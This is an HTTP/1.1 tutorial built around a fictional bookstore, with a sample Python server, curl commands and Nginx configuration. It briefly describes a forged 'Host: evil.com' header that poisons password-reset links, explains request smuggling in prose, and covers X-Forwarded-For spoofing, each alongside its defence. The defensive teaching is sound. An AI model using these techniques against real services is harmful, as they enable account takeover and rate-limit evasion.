# Lesson 5 — HTTP Requests and Responses

*Phase 1, Topic 5*

## 1. Simple definition

**HTTP** (HyperText Transfer Protocol) is a text-based set of rules for asking a server for something and getting an answer back. It is the language spoken *inside* the byte pipe that TCP gives you (Lesson 3 built the pipe; Lesson 8 explains how the pipe works).

Three terms, defined before use:

- A **protocol** is an agreed format plus an agreed sequence. Both sides must encode the same way and take turns the same way, or the conversation is noise.
- A **request** is one message from client to server: "here is the thing I want, here is what I know about myself."
- A **response** is one message back: "here is the outcome, here is some metadata, here is the data."

HTTP's defining property: **it is a request/response protocol, and each exchange is self-contained.** The server does not remember that you asked something a second ago (Lesson 2 — stateless servers). Anything it needs to know must be *in the request*.

A fourth term you will see constantly: **a resource** is whatever the URL names — a book, a list of books, a search result, an image. The URL is the name; HTTP is the verb-and-envelope system for acting on that name.

## 2. Why it exists

Before HTTP, every networked application invented its own wire format. FTP had one, SMTP had another, each database had its own. Three problems followed:

1. **No interoperability.** A client written for one server could not talk to another. Every pairing needed custom code.
2. **No intermediaries.** If only the two endpoints understand the format, nothing in the middle can help. You cannot cache, route, compress, or audit a message you cannot parse.
3. **No evolution.** Adding a field to a binary protocol broke every old client.

HTTP solved all three with three design choices:

- **A uniform interface**: a small fixed set of methods (`GET`, `POST`, …) acting on URLs, so any client can talk to any server without prior agreement about *verbs*.
- **Human-readable, extensible headers**: key-value metadata that unknown parties can forward untouched. This is what makes proxies, load balancers, CDNs (Phase 2, Topic 14 — CDNs and edge caching), and API gateways (Phase 4, Topic 10) possible at all.
- **Explicit, standard semantics for caching and errors**, so intermediaries can act correctly without understanding the application.

The deeper reason HTTP won: **it made the middle of the network useful.** Almost every scaling technique in Phases 2–4 is a box inserted in the middle that understands HTTP.

## 3. Real-world analogy

HTTP is **postal mail with a strict envelope standard**.

- The **address on the envelope** is the request line: what you want and where it lives.
- The **envelope's printed fields** (sender, postage class, "fragile", "deliver by") are headers: metadata about the letter that the postal service reads but the recipient's letter-opener does not need.
- The **blank space between the envelope and the letter** is the empty line separating headers from body.
- The **letter inside** is the body.
- The **reply letter** comes back with a stamped outcome on it: *delivered*, *moved — forwarding address enclosed*, *no such person*, *post office on fire*. Those are status codes (Lesson 6).

Sorting offices along the way read only the envelope. They never open the letter. That is exactly how an HTTP proxy or CDN works.

**Where the analogy breaks down**

| Postal mail | Real HTTP |
|---|---|
| The envelope and letter travel as one physical object | Request and response are *byte streams*; the body may still be arriving while the headers are already being processed (streaming, chunked encoding) |
| You post a letter and may wait days; the channel is one-way | HTTP is a tight request→response round trip, typically 50–300 ms, and the client blocks on it |
| Each letter needs a new envelope and a new stamp | One TCP connection carries many request/response pairs (keep-alive) — re-stamping is the expensive part we try to avoid |
| The postal service never alters your letter | Proxies legitimately rewrite headers, compress bodies, strip cookies, add `X-Forwarded-For` |
| A lost letter is simply lost | A lost HTTP response is *ambiguous*: the work may have been done anyway (Lesson 17 — idempotency, retries, timeouts) |
| Envelopes can be any size | Servers impose hard header-size limits (typically 8 KB total) and will reject you with `431`/`400` |

The last two rows matter most. "The letter might have been read even though no reply came" is the defining hazard of all networked systems.

## 4. Detailed technical explanation

### 4.1 The raw wire format — literally what bytes travel

This is the single most valuable thing in this lesson. HTTP/1.1 is plain ASCII text. Here is a complete request exactly as it appears on the wire. `\r\n` is a carriage return followed by a line feed — two bytes, `0x0D 0x0A` — and it is **mandatory**; a bare `\n` is technically malformed (most servers tolerate it, which turns out to matter in §4.8).

```
GET /books/1492052205?format=json HTTP/1.1\r\n      <- request line
Host: booknook.com\r\n                              <- headers begin
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\r\n
Accept: application/json, text/html;q=0.9, */*;q=0.1\r\n
Accept-Encoding: gzip, br\r\n
Accept-Language: en-IN, en;q=0.9, hi;q=0.8\r\n
Cookie: session=7f3a9c21b4e8\r\n
Connection: keep-alive\r\n
\r\n                                                <- blank line = end of headers
                                                    <- (no body for this GET)
```

Structure, formally:

1. **Request line**: `METHOD SP request-target SP HTTP-version CRLF`. Three fields, space-separated.
2. **Zero or more header lines**: `Field-Name: field-value CRLF`. Names are case-insensitive (`host` == `Host`).
3. **One empty line** (`CRLF` alone). This is the *only* marker that headers have ended.
4. **Optional body**: raw bytes, length determined by `Content-Length` or `Transfer-Encoding` (§4.3).

And the response, same shape with a status line instead of a request line:

```
HTTP/1.1 200 OK\r\n                                 <- status line: version, code, reason
Content-Type: application/json; charset=utf-8\r\n
Content-Encoding: gzip\r\n
Content-Length: 1841\r\n
Cache-Control: public, max-age=300\r\n
ETag: "a3f1c9"\r\n
Date: Wed, 08 Oct 2026 17:11:04 GMT\r\n
Connection: keep-alive\r\n
\r\n
\x1f\x8b\x08\x00... (1841 bytes of gzip-compressed JSON)
```

The **reason phrase** (`OK`, `Not Found`) is decorative — clients must act on the numeric code and ignore the text. HTTP/2 and HTTP/3 drop it entirely (Lesson 9 — HTTP/1.1 vs HTTP/2 vs HTTP/3).

**Simplified teaching model vs production reality:** everything above is literally true for HTTP/1.1. In HTTP/2 and HTTP/3 the *semantics* are identical — same methods, same headers, same status codes — but the bytes are binary frames with compressed header tables. When you read "HTTP is text", read it as "HTTP/1.1 is text, and HTTP/1.1 is still what you debug with `curl` and what a large share of internal service-to-service traffic uses."

### 4.2 The `Host` header and virtual hosting

In HTTP/1.0 the request line carried only the path. That was fine when one IP address meant one website. It stopped being fine around 1996 when IPv4 addresses became scarce and hosting companies wanted 500 sites on one machine.

The problem: TCP connects to an **IP address and port** (Lesson 3). The server accepts a connection on `203.0.113.10:443` and has no idea whether the client meant `booknook.com` or `cafe-recipes.com` — both resolve to that IP (Lesson 4 — DNS resolution and caching).

`Host` fixes this. It is the one header that is **mandatory in HTTP/1.1** — a request without it must be rejected with `400 Bad Request`.

```
GET /index.html HTTP/1.1
Host: booknook.com        <- this is what selects the site
```

The server (or more likely Nginx in front of it) matches `Host` against its configured **virtual hosts** (also called *server blocks*) and routes accordingly. This is how a single load balancer IP fronts hundreds of services, and it is the mechanism behind host-based routing in Kubernetes Ingress and every API gateway.

Two consequences worth remembering:

- `Host` is attacker-controlled. If your app builds password-reset links from `Host`, an attacker sends `Host: evil.com` and your email contains a link to their server. Always validate `Host` against an allowlist.
- For HTTPS, the *encrypted* `Host` header is useless for choosing which certificate to present, because the certificate is chosen during the handshake *before* any HTTP is sent. That is what SNI solves — Lesson 7.

### 4.3 Where does the body end? `Content-Length` vs chunked transfer encoding

TCP is a **stream of bytes with no message boundaries** (Lesson 8). If the server just starts writing JSON, the client has no way to know where the response stops and the next response begins. HTTP offers exactly two answers.

**Option A — `Content-Length: 1841`.** "Read exactly 1841 bytes after the blank line, then stop." Simple and cheap. Requires the sender to know the full size *before sending the first byte*, which means buffering the entire body in memory.

**Option B — `Transfer-Encoding: chunked`.** Send the body as a sequence of chunks, each prefixed by its size in **hexadecimal**, terminated by a zero-length chunk:

```
HTTP/1.1 200 OK
Content-Type: application/json
Transfer-Encoding: chunked

1a\r\n                        <- 0x1a = 26 bytes of data follow
{"books":[{"isbn":"149205\r\n
13\r\n                        <- 0x13 = 19 bytes
2205","title":"SRE"\r\n
5\r\n
}]}\r\n\r\n
0\r\n                         <- zero-size chunk = body complete
\r\n                          <- optional trailers would go here
```

Chunked exists for bodies whose length is unknown when the first byte goes out: streaming a 2 GB CSV export, server-sent events, a slow database cursor, a response generated by a template engine that you do not want to buffer. The cost is a few bytes per chunk and slightly more complex parsing.

Rules of thumb:
- Known, small body (an API JSON response under ~1 MB): use `Content-Length`. Frameworks do this for you.
- Unknown or very large body: use chunked. Frameworks switch automatically when you return a generator/stream.
- **Never send both.** If both are present, `Transfer-Encoding` wins and `Content-Length` must be ignored — which is the root of §4.8.

### 4.4 Keep-alive and connection reuse

Opening a connection is not free. Before any HTTP byte moves you pay:

- 1 round trip for the TCP three-way handshake (Lesson 8),
- 1 more round trip for TLS 1.3, or 2 for TLS 1.2 (Lesson 7).

On a 60 ms round-trip-time (RTT) link that is 120–180 ms of pure setup before the server even sees your request. HTTP/1.0 closed the connection after every response and paid that on every single asset.

HTTP/1.1 made **persistent connections the default**. `Connection: keep-alive` is implied; you must send `Connection: close` to opt out. The same TCP connection then carries request → response → request → response sequentially.

Important limits of HTTP/1.1 keep-alive:

- **One in-flight request per connection.** Request 2 cannot be sent until response 1 has fully arrived. This is **head-of-line blocking at the HTTP layer**, and it is why browsers open **6 parallel connections per hostname** (a convention, not a standard). Lesson 9 shows how HTTP/2 multiplexing removes this.
- **Pipelining** (sending several requests without waiting) was specified but is effectively dead — broken proxies and the fact that responses still had to come back in order made it worse than useless.
- Connections are **idle-timed out**. Typical values: Nginx `keepalive_timeout 75s`, AWS ALB 60 s, Node.js 5 s by default. A mismatch where the server closes at 60 s and the client assumes 75 s produces sporadic, maddening connection-reset errors — see §11.

Server-to-server calls benefit even more than browsers, because an internal call might have a 1 ms RTT but a 200 µs body. If you create a new connection per call you spend the majority of your time on handshakes. **Always use a connection-pooling HTTP client** (`requests.Session`, Go's default `http.Transport`, Java's `HttpClient`, `undici` in Node).

### 4.5 Content negotiation

The same URL can have several representations. Content negotiation lets the client state preferences and the server choose. These headers use **quality values** (`q=`), a float from 0 to 1 defaulting to 1, meaning "relative preference".

| Request header | Means | Matching response header |
|---|---|---|
| `Accept: application/json, text/html;q=0.9` | "JSON preferred; HTML acceptable" | `Content-Type: application/json` |
| `Accept-Encoding: gzip, br, zstd` | "I can decompress these" | `Content-Encoding: br` |
| `Accept-Language: en-IN, hi;q=0.8` | "Indian English first, Hindi acceptable" | `Content-Language: en-IN` |
| `Accept-Charset` (obsolete) | — | `charset=` inside `Content-Type` |

The server picks and **must** announce its choice in the matching response header, and **must** send `Vary: Accept-Encoding, Accept-Language`. `Vary` tells caches "this URL has multiple variants; key your cache on these request headers too." Forgetting `Vary` is how a gzip-compressed body gets served to a client that cannot decompress it, or how a Hindi page gets cached and served to English users.

If the server cannot satisfy the request it may return `406 Not Acceptable`, but in practice most APIs ignore `Accept` and always return JSON. That is a legitimate simplification; just be deliberate about it.

### 4.6 Compression: gzip and brotli

Text compresses extraordinarily well because HTML, JSON, CSS and JS are full of repeated tokens.

| Algorithm | Typical text ratio | Speed | Where it fits |
|---|---|---|---|
| **gzip** (DEFLATE) | 3–5× smaller | Fast; level 6 default | Universal support since the 1990s; safe default for dynamic responses |
| **brotli** (`br`) | 15–25 % smaller than gzip | Slow at level 11, fast at 4–5 | Best for *static* assets precompressed at build time; use level 4–5 for dynamic |
| **zstd** | ≈ brotli ratio, much faster | Very fast | Growing support; common internally |

Concrete BookNook numbers (typical, approximate):

- A 40 KB JSON search-results response → ~9 KB gzip (≈ 4.4×) → ~7.6 KB brotli.
- A 250 KB JavaScript bundle → ~78 KB gzip → ~66 KB brotli.

**Do not compress already-compressed formats.** JPEG, PNG, WebP, MP4, and ZIP gain ~0–2 % and cost CPU. Configure your server to compress only `text/*`, `application/json`, `application/javascript`, `image/svg+xml`, and similar.

**Do not compress tiny responses.** Below roughly 1 KB, gzip's ~20-byte header plus worse compression on short inputs can make the response *larger*. Nginx's `gzip_min_length 1000;` exists for this.

There is also a security caveat: compressing a response that mixes attacker-controlled input with a secret enables the BREACH class of attacks. The practical mitigation is to not put secrets (CSRF tokens) in compressed response bodies alongside reflected user input.

### 4.7 Header size limits

Headers look free. They are not.

- Nginx: `large_client_header_buffers 4 8k` — the request line plus all headers must fit in 8 KB by default; exceeding it returns **`400 Bad Request`** (or `414` for a long URL).
- Apache: `LimitRequestFieldSize 8190` bytes per header line.
- Node.js: `--max-http-header-size`, default **16 KB**.
- AWS ALB: 64 KB total request headers; Cloudflare: 32 KB.
- The correct status code for "your headers are too big" is **`431 Request Header Fields Too Large`**, but many servers send `400` instead.

The classic outage: an app keeps piling data into cookies. Cookies are sent on *every* request to that domain. One day total cookie size crosses 8 KB and every user who has visited enough pages gets a hard `400` from Nginx — for all URLs, permanently, until they clear cookies. Debugging it is miserable because it only affects long-term users.

Also note headers are uncompressed in HTTP/1.1. 800 bytes of headers on a 200-byte API response is 80 % overhead. HTTP/2's HPACK header compression (Lesson 9) exists precisely because of this.

### 4.8 Request smuggling, in one paragraph

**HTTP request smuggling** happens when two servers in a chain — typically a front-end proxy/CDN and a back-end application server — disagree about where one request ends and the next begins. The attacker sends a single request containing *both* `Content-Length` and `Transfer-Encoding: chunked`, or a malformed variant like a duplicated `Transfer-Encoding` line or an obfuscated `Transfer-Encoding : chunked` with a stray space. The front-end uses one framing rule, the back-end uses the other, and the trailing bytes the front-end considered "body" are parsed by the back-end as the *start of a new request*. Because both servers reuse the same keep-alive connection for many users' requests, that smuggled prefix gets glued onto the **next victim's** request — letting the attacker rewrite another user's path, capture their session cookie by making their request echo into an attacker-readable endpoint, or bypass front-end authorisation entirely. Defences: reject any request carrying both framing headers, normalise requests at the edge, prefer HTTP/2 end-to-end (its framing is explicit and length-prefixed), and never downgrade HTTP/2 to HTTP/1.1 at a proxy without strict validation.

### 4.9 `X-Forwarded-For` and client IPs behind proxies

Once you put a load balancer or CDN in front of your app (Phase 2, Topic 4 — load balancing), the TCP connection your app sees originates from the **proxy**, not the user. `request.remote_addr` becomes `10.0.1.37` for everyone. That breaks rate limiting, geolocation, abuse blocking, and audit logs.

The convention is a header appended by each proxy:

```
X-Forwarded-For: 203.0.113.55, 70.41.3.18, 150.172.238.178
                 ^ original client  ^ proxy 1    ^ proxy 2
X-Forwarded-Proto: https
X-Forwarded-Host: booknook.com
```

The standardised replacement is `Forwarded: for=203.0.113.55;proto=https;host=booknook.com`, but `X-Forwarded-For` remains dominant.

**The security rule, which is violated constantly:** `X-Forwarded-For` is just a header, so a client can send `X-Forwarded-For: 1.2.3.4` directly and forge their IP. The correct algorithm is: **trust only the entries appended by proxies you control.** Configure the number of trusted hops (Nginx `set_real_ip_from` + `real_ip_recursive`, Express `app.set('trust proxy', 2)`, Django with a hop-counting middleware) and take the right-most untrusted entry, not the left-most. Taking the left-most blindly means an attacker bypasses your IP-based rate limiter by sending a random fake IP on every request.

`X-Forwarded-Proto` matters too: your app sees plain HTTP from the load balancer even though the user used HTTPS (Lesson 7 — TLS termination). Without honouring this header, your redirect logic builds `http://` URLs and your `Secure` cookies never get set.

## 5. Request / data flow

A BookNook user clicks a book, start to finish:

1. Browser has `booknook.com` → `203.0.113.10` already cached from DNS (Lesson 4).
2. Browser checks its **HTTP cache** for `/books/1492052205`. Suppose a stale copy exists with `ETag: "a3f1c9"` — it will revalidate rather than refetch (Lesson 6).
3. Browser finds an existing idle keep-alive TCP+TLS connection to that host. No handshake needed. (If none: TCP handshake 1 RTT + TLS 1.3 handshake 1 RTT.)
4. Browser serialises the request: request line, then headers including `Host`, `Accept`, `Accept-Encoding: gzip, br`, `Cookie`, `If-None-Match: "a3f1c9"`.
5. Browser writes `\r\n\r\n` to end the header block, then writes no body (GET).
6. Bytes travel to the CDN edge node, which parses the request line and `Host` to decide routing. Cache miss for this user-specific page → forward to origin.
7. CDN appends `X-Forwarded-For: <user IP>` and `X-Forwarded-Proto: https` and forwards over its own pooled connection to the load balancer.
8. Load balancer terminates TLS, picks a healthy app server, forwards the request.
9. App server reads bytes from the socket **in a loop** until it sees `\r\n\r\n`, parses the header block, and checks whether a body is expected (it isn't).
10. App server validates `Host` against its allowlist, resolves the route `/books/{isbn}`, and runs the handler.
11. Handler queries Redis (miss) then PostgreSQL (12 ms), builds a book object, computes an ETag from the row's `updated_at` plus id.
12. ETag matches `If-None-Match` → the server returns **`304 Not Modified`** with headers and **no body**. (If it didn't match: `200` plus body.)
13. Server sets `Content-Length: 0`, `Cache-Control: private, max-age=60`, `ETag`, `Vary: Accept-Encoding`.
14. Response travels back; the app server keeps the connection open for the next request.
15. Browser sees `304`, promotes its cached copy to fresh, and renders — having transferred ~300 bytes instead of ~9,000.
16. The page then issues 40 more requests (CSS, JS, covers, `/api/reviews`) across the same 6 parallel connections.

## 6. ASCII diagram

```
 +---------------------- ONE HTTP/1.1 EXCHANGE ON THE WIRE -----------------------+
 |                                                                                |
 |  CLIENT                                                       SERVER           |
 |    |                                                             |             |
 |    |  GET /books/1492052205 HTTP/1.1   <- request line           |             |
 |    |  Host: booknook.com               <- selects virtual host   |             |
 |    |  Accept-Encoding: gzip, br        <- content negotiation    |             |
 |    |  If-None-Match: "a3f1c9"          <- conditional request    |             |
 |    |  Cookie: session=7f3a9c21         <- carried state (L2/L6)  |             |
 |    |  (CRLF)                           <- BLANK LINE ends hdrs   |             |
 |    |  <no body>                                                  |             |
 |    | -----------------------------------------------------------> parse+route |
 |    |                                                             | DB / cache  |
 |    |  HTTP/1.1 200 OK                  <- status line            |             |
 |    |  Content-Type: application/json                             |             |
 |    |  Content-Encoding: gzip           <- chosen representation  |             |
 |    |  Content-Length: 1841             <- where the body ENDS    |             |
 |    |  ETag: "b7d2e0"                                             |             |
 |    |  Vary: Accept-Encoding            <- cache key hint         |             |
 |    |  (CRLF)                                                     |             |
 |    |  1f 8b 08 00 ... (1841 bytes)     <- body                   |             |
 |    | <-----------------------------------------------------------|             |
 |    |                                                             |             |
 |    |  === connection STAYS OPEN (keep-alive); next request reuses it ===        |
 +--------------------------------------------------------------------------------+

 FRAMING: how does the receiver know where the body ends?
 +-------------------------+----------------------------------------------+
 | Content-Length: 1841    | read exactly 1841 bytes, then stop           |
 | Transfer-Encoding:      | 1a\r\n<26 bytes>\r\n  5\r\n<5 bytes>\r\n     |
 |   chunked               | 0\r\n\r\n   <- zero chunk = done             |
 | BOTH present            | (!) ambiguity -> request smuggling (S4.8)    |
 +-------------------------+----------------------------------------------+

 THE CHAIN, and who adds what:

   Browser ----> CDN edge ----> Load balancer ----> App server
   adds:         adds XFF       terminates TLS      reads XFF, trusting ONLY
   Cookie        adds XFProto   appends XFF hop     the hops it controls;
   Accept-*                                         reads X-Forwarded-Proto
```

## 7. Detailed example

### BookNook: the search endpoint, byte by byte

A user searches "site reliability". The browser sends:

```
GET /api/search?q=site+reliability&page=1 HTTP/1.1
Host: booknook.com
Accept: application/json
Accept-Encoding: gzip, br
Accept-Language: en-IN,en;q=0.9
Cookie: session=7f3a9c21b4e8; ab_test=variant_b; cart_count=2
Referer: https://booknook.com/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Connection: keep-alive
```

Total request size: roughly 420 bytes, *almost none of it the actual query*. The query is 38 bytes. **Headers are roughly 10× the payload** — that is normal, and it is why HTTP/2 compresses them.

Server response:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Encoding: br
Content-Length: 7640
Cache-Control: private, max-age=0, must-revalidate
Vary: Accept-Encoding, Accept-Language
ETag: W/"search-site-reliability-p1-v39"
X-Request-Id: 01JC7K2V8WQ3
Date: Wed, 08 Oct 2026 17:11:04 GMT

<7640 bytes of brotli-compressed JSON — 40 KB uncompressed>
```

Two deliberate choices worth noting: `Cache-Control: private` because search results may reflect the user's region and A/B bucket, and a **weak ETag** (`W/`) because the body is semantically but not byte-for-byte stable (JSON key order may vary between servers).

Now the checkout, which has a body:

```
POST /api/orders HTTP/1.1
Host: booknook.com
Content-Type: application/json
Content-Length: 46
Idempotency-Key: 0f9b2a7c-4e5d-4a19-9f2b-1c0a6d8e3b11
Cookie: session=7f3a9c21b4e8

{"items":[{"isbn":"1492052205","quantity":2}]}
```

The body carries **intent only** — no price, no total (Lesson 1's trust boundary). `Idempotency-Key` is a forward reference to Lesson 17: if the response is lost and the client retries, the server recognises the key and returns the original result instead of creating a second order.

### Contrasting example: a video-streaming manifest and byte-range requests

Netflix-style streaming uses the same HTTP but exercises completely different features. The player first fetches a small manifest, then requests **ranges** of large media files:

```
GET /video/ep1/segment_0042.m4s HTTP/1.1
Host: cdn.example.com
Range: bytes=0-1048575          <- give me only the first 1 MiB
```

```
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1048575/48234112
Content-Length: 1048576
Content-Type: video/iso.segment
Cache-Control: public, max-age=31536000, immutable
Accept-Ranges: bytes
```

Differences from BookNook, and why they exist:

| | BookNook API | Video segment |
|---|---|---|
| Body size | ~7 KB compressed | 1 MiB per range, GBs total |
| Compression | gzip/brotli, ~4× win | **None** — already compressed; `Content-Encoding` would waste CPU |
| Caching | `private, max-age=0` | `public, immutable, 1 year` — content never changes, the URL changes instead |
| Framing | `Content-Length` | `Content-Length` per range; ranges enable seek and resume |
| Status | 200 / 304 | **206 Partial Content** |
| Connection | keep-alive, 6 parallel | keep-alive, many parallel, often HTTP/2 or QUIC |

Same protocol, opposite tuning. The lesson: HTTP's knobs (`Range`, `Cache-Control`, `Content-Encoding`) are what let one protocol serve a 400-byte JSON call and a 4 GB movie.

## 8. Code or configuration example

**This code illustrates the concept and is not production-ready.** It parses HTTP by hand so you can see the format; real systems use a hardened parser.

```python
import socket, gzip, json

# A hand-rolled HTTP/1.1 server: ONE connection at a time, no TLS, no timeouts.
# Purpose: make the request/response byte format visible. Do not ship this.

def read_http_request(conn):
    """Read until we have the full header block, then read exactly the body."""
    buf = b""
    # CRITICAL: TCP is a byte STREAM (Lesson 8). One recv() may return half a
    # header line, or two requests glued together. We must loop until the
    # header terminator b"\r\n\r\n" appears. Assuming one recv == one request
    # is the single most common bug in hand-written servers.
    while b"\r\n\r\n" not in buf:
        chunk = conn.recv(4096)
        if not chunk:                       # peer closed before finishing
            return None, {}, b""
        buf += chunk
        if len(buf) > 8192:                 # enforce a header size limit (S4.7)
            return "TOO_LARGE", {}, b""     # real servers reply 431

    head, rest = buf.split(b"\r\n\r\n", 1)  # `rest` is the START of the body
    lines = head.decode("iso-8859-1").split("\r\n")
    request_line = lines[0]                 # e.g. "POST /api/orders HTTP/1.1"

    headers = {}
    for line in lines[1:]:
        name, _, value = line.partition(":")
        # Header names are case-INSENSITIVE, so normalise before lookup.
        headers[name.strip().lower()] = value.strip()

    # Framing (S4.3). Two mutually exclusive ways to find the body's end.
    if "transfer-encoding" in headers and "content-length" in headers:
        # Both present => ambiguity => request smuggling risk. Reject outright.
        return "SMUGGLE", headers, b""

    body = rest
    length = int(headers.get("content-length", 0))
    while len(body) < length:               # the body may span several packets
        body += conn.recv(4096)

    return request_line, headers, body[:length]


def build_response(obj, accept_encoding, etag, if_none_match):
    # Conditional request (Lesson 6): if the client's copy is current,
    # send 304 with NO body. That saves the entire payload.
    if if_none_match == etag:
        return (
            b"HTTP/1.1 304 Not Modified\r\n"
            + f"ETag: {etag}\r\n".encode()
            + b"Content-Length: 0\r\n"      # explicit zero keeps keep-alive sane
            + b"\r\n"
        )

    body = json.dumps(obj).encode()
    headers = [b"HTTP/1.1 200 OK", b"Content-Type: application/json; charset=utf-8"]

    # Content negotiation (S4.5): compress only if the client said it can decode,
    # and only if the payload is big enough to be worth it (S4.6).
    if "gzip" in accept_encoding and len(body) >= 1000:
        body = gzip.compress(body, compresslevel=6)
        headers.append(b"Content-Encoding: gzip")

    headers.append(f"Content-Length: {len(body)}".encode())   # where the body ends
    headers.append(f"ETag: {etag}".encode())
    # Vary tells every cache in the path that this URL has per-encoding variants.
    # Omitting it serves gzip bytes to clients that cannot decompress them.
    headers.append(b"Vary: Accept-Encoding")
    headers.append(b"Connection: keep-alive")                 # reuse the connection

    return b"\r\n".join(headers) + b"\r\n\r\n" + body         # BLANK LINE then body
```

Inspect real traffic — the fastest way to internalise the format:

```bash
# -v prints the request line and headers the client sent and the server returned.
curl -v "https://booknook.com/api/search?q=sre"

# --compressed advertises Accept-Encoding and transparently decodes the reply.
# Compare the two numbers to see the compression win in bytes.
curl -s -o /dev/null -w '%{size_download}\n' "https://booknook.com/api/search?q=sre"
curl -s -o /dev/null --compressed -w '%{size_download}\n' "https://booknook.com/api/search?q=sre"

# Watch a conditional request return 304 with a zero-length body.
curl -i -H 'If-None-Match: "a3f1c9"' https://booknook.com/books/1492052205
```

A realistic Nginx configuration covering the same concepts:

```nginx
server {
    listen 443 ssl http2;
    server_name booknook.com;                  # virtual host match on Host header (S4.2)

    # Header size limits (S4.7): 4 buffers of 8k. Exceeding this returns 400.
    large_client_header_buffers 4 8k;

    # Keep-alive toward browsers: hold idle connections 75s, up to 1000 requests each.
    keepalive_timeout 75s;
    keepalive_requests 1000;

    gzip on;
    gzip_min_length 1000;                      # below ~1KB gzip can ENLARGE (S4.6)
    gzip_types application/json application/javascript text/css text/html image/svg+xml;
    gzip_vary on;                              # emits "Vary: Accept-Encoding" for caches

    location /api/ {
        proxy_pass http://app_upstream;
        proxy_http_version 1.1;                # 1.0 is the default here and kills keep-alive
        proxy_set_header Connection "";        # required so upstream keep-alive works

        proxy_set_header Host $host;                                  # preserve virtual host
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # append, never replace
        proxy_set_header X-Forwarded-Proto $scheme;                   # the app must honour this
    }
}

upstream app_upstream {
    server 10.0.1.11:8000;
    server 10.0.1.12:8000;
    keepalive 64;                              # pool of idle upstream connections
}
```

## 9. Numerical example

**Goal:** quantify compression, header overhead, and connection reuse for a single BookNook page load.

**Assumptions (all stated, all typical/approximate):**
- One product page triggers **60 HTTP requests**: 1 HTML, 4 CSS/JS, 8 book-cover images, 47 small API/analytics/font requests.
- Average request headers: **700 bytes** (cookies ≈ 250 B, `User-Agent` ≈ 120 B, `Accept-*` ≈ 150 B, rest ≈ 180 B).
- Average response headers: **350 bytes**.
- Text payloads (HTML + CSS + JS + JSON), uncompressed total: **420 KB**.
- Image payloads (already compressed): **1,600 KB**.
- gzip ratio on this text mix: **4.0×**; brotli: **4.8×**.
- RTT from user to origin: **60 ms**. TCP handshake = 1 RTT. TLS 1.3 handshake = 1 RTT.
- Browser opens up to **6 parallel connections** per hostname.
- Bandwidth is not the bottleneck; we measure bytes and handshake time only.

**Step 1 — Header overhead per page**

```
Request headers  = 60 requests x 700 B = 42,000 B = 42.0 KB
Response headers = 60 requests x 350 B = 21,000 B = 21.0 KB
Total header bytes                     = 63.0 KB
```

**Step 2 — Payload with and without compression**

```
Text, uncompressed                = 420 KB
Text, gzip   = 420 / 4.0          = 105 KB     -> saved 315 KB
Text, brotli = 420 / 4.8          =  87.5 KB   -> saved 332.5 KB
Images (HTTP does not compress)   = 1,600 KB   (unchanged)
```

**Step 3 — Total page weight in each case**

```
No compression : 420   + 1600 + 63 = 2,083 KB
gzip           : 105   + 1600 + 63 = 1,768 KB    (-15.1 % vs none)
brotli         :  87.5 + 1600 + 63 = 1,750.5 KB  (-16.0 % vs none)
```

**Interpretation, and the trap:** compression saved 315 KB of text but only 15 % of the page, because **images dominate**. The headline number everyone quotes ("gzip makes it 4× smaller") is true only of the text. The actionable conclusion is therefore the *image* strategy — WebP/AVIF conversion, correct sizing, and a CDN (Phase 2, Topic 14 — CDNs and edge caching) — not more compression levels.

**Step 4 — brotli vs gzip is marginal here**

```
brotli advantage = 105 - 87.5 = 17.5 KB = 0.99 % of the page
```

Spending CPU on brotli level 11 for *dynamic* responses to win 1 % of page weight is a bad trade. Precompressing *static* assets at build time with brotli 11 costs nothing at request time and is strictly worth it. That distinction — build-time cost vs request-time cost — is the entire decision.

**Step 5 — Header overhead relative to API payloads specifically**

Take just the 47 small API/analytics calls; assume an average compressed response body of **900 B**:

```
Payload bytes  = 47 x 900                   = 42,300 B
Header bytes   = 47 x (700 + 350)           = 49,350 B
Overhead ratio = 49,350 / (49,350 + 42,300) = 53.8 %
```

**More than half the bytes for small API calls are headers.** That is the quantitative argument for HTTP/2's HPACK (Lesson 9), which typically compresses repeated header sets by 85–90 %:

```
HPACK'd header bytes = 49,350 x 0.12 = 5,922 B
Savings per page     = 49,350 - 5,922 = 43,428 B = 43.4 KB
```

Note 43.4 KB saved by HPACK is **2.5× larger** than the 17.5 KB brotli saved over gzip. Protocol choice beats compression tuning.

**Step 6 — Connection setup cost**

```
Connections needed with no reuse (HTTP/1.0 style) = 60
Setup per connection = TCP 1 RTT + TLS 1.3 1 RTT = 2 x 60 ms = 120 ms
Six run in parallel, so:
   waves      = ceil(60 / 6) = 10
   setup time = 10 x 120 ms  = 1,200 ms of pure handshaking
```

```
With keep-alive: 6 connections opened once and reused
   setup time = 1 wave x 120 ms = 120 ms
   Saving     = 1,200 - 120     = 1,080 ms ~= 1.08 s
```

**Keep-alive saves ~1.1 seconds on a single page load** at 60 ms RTT. On a 200 ms mobile link:

```
Setup per connection = 2 x 200 ms = 400 ms
No reuse   : 10 waves x 400 ms = 4,000 ms
Keep-alive :  1 wave  x 400 ms =   400 ms
Saving     = 3,600 ms = 3.6 s
```

This is why connection reuse is non-negotiable, and why internal service clients that open a new connection per call are a silent performance disaster.

## 10. Trade-offs

**Advantages of HTTP as a wire format**
- **Human-readable** (in 1.1): you can debug with `telnet`, `curl -v`, or `tcpdump` and simply read it.
- **Universally supported**: every language, proxy, firewall, and cloud service already speaks it. Port 443 is open everywhere; custom protocols are not.
- **Extensible without breaking**: unknown headers are forwarded untouched, so you can add `X-Request-Id` or `Idempotency-Key` with zero coordination.
- **Intermediary-friendly**: caching, routing, compression, authentication, and rate limiting can all be done by boxes that know nothing about your application.
- **Explicit semantics for caching and errors**, which is what makes CDNs able to do real work.

**Disadvantages**
- **Verbose.** §9 showed 54 % header overhead on small API calls. Binary protocols like gRPC (Lesson 11) are dramatically more compact.
- **Text parsing is CPU work and a security surface.** Decades of CVEs come from HTTP parsers disagreeing (§4.8).
- **Request/response only.** The server cannot initiate. Push requires WebSockets, SSE, or long polling (Lesson 13 — synchronous versus asynchronous communication).
- **HTTP/1.1 head-of-line blocking**: one in-flight request per connection, hence the 6-connection hack.
- **Statelessness** means re-sending identity on every request — cookies and tokens on all 60 requests (Lesson 6).

**Operational costs**
- You must configure limits (header size, body size, timeouts) or they become outages.
